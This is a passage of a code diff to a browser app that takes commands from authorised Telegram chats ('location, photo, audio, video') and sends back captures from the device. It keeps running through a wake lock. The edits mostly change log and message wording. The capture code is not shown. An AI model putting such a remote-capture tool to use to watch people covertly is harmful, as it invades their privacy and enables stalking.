-      await sendMsg(chatId, `📱 *Commands for ${userName}:* location, photo, audio, video, message`, true);
+      await sendMsg(chatId, `📱 *Commands:* location, photo, audio, video, message`, true);
     }
   }
 
@@ -877,11 +985,11 @@
             if(settings.authorizedChatIds.some(id=>String(id)===chatId)) {
               if(!processedUpdateIds.has(update.update_id)) {
                 processedUpdateIds.add(update.update_id);
-                addLog(`📨 ${userName} (${chatId}): "${msg.text}"`, 'cmd');
+                addLog(`📨 ${userName}: "${msg.text}"`, 'cmd');
                 await processCommand(msg.text, chatId, userName);
               }
             } else {
-              await sendMsg(chatId, `🔒 *Access Denied ${userName}*\n\nYour Chat ID: \`${chatId}\``, true);
+              await sendMsg(chatId, `🔒 *Access Denied ${userName}*\n\nChat ID: \`${chatId}\``, true);
             }
           }
         }
@@ -930,7 +1038,7 @@
   async function testBot() {
     if(!settings.botToken) { alert('Set bot token first'); return; }
     if(!settings.authorizedChatIds.length) { alert('Add a chat ID first'); return; }
-    await sendMsg(settings.authorizedChatIds[0], "✅ *Bot is working!* 🎉\n\n🌙 Background mode enables camera/audio!", true);
+    await sendMsg(settings.authorizedChatIds[0], "✅ *Bot is working!* 🎉\n\nCommands: location, photo, audio, video, message", true);
     addLog('✅ Test sent!', 'success');
   }
 
@@ -942,14 +1050,14 @@
   document.getElementById('revokeCamBtn').onclick = revokeCam;
   document.getElementById('revokeMicBtn').onclick = revokeMic;
   
-  enableBackgroundBtn.onclick = enableBackgroundMode;
-  disableBackgroundBtn.onclick = disableBackgroundMode;
+  enableBackgroundBtn.onclick = enableWakeLock;
+  disableBackgroundBtn.onclick = disableWakeLock;
   
   saveSettingsBtn.onclick = () => {
     settings.botToken = botTokenInput.value.trim();
     settings.pollingIntervalSec = parseInt(pollingIntervalSelect.value);
     persistSettings();
-    addLog(`⚙️ Settings saved. Polling: ${settings.pollingIntervalSec}s`, 'success');
+    addLog(`⚙️ Settings saved`, 'success');
     if(settings.botToken?.length>20) startPolling();
   };
   
@@ -960,7 +1068,7 @@
       persistSettings();
       newChatIdInput.value = '';
       addLog(`➕ Added ${newId}`, 'success');
-      sendMsg(newId, "✅ *Authorized!* 🎉\n\nSend: location, photo, audio, video, message", true);
+      sendMsg(newId, "✅ *Authorized!* 🎉\n\nSend: location, photo, audio, video", true);
     }
   };
   
@@ -973,8 +1081,12 @@
   // Initialize
   loadPerms();
   loadSettings();
-  restoreBackgroundMode();
-  verifyPerms().then(() => addLog('🚀 App ready! Enable Background Mode for camera/audio to work in background!', 'success'));
+  restoreWakeLock();
+  verifyPerms().then(() => {
+    addLog('🚀 App ready! Grant permissions first, then test commands.', 'success');
+    if(!permissions.camera) addLog('⚠️ Click "Grant" next to Camera to enable photos', 'warn');
+    if(!permissions.microphone) addLog('⚠️ Click "Grant" next to Microphone to enable audio', 'warn');
+  });
 </script>
 </body>
 </html>
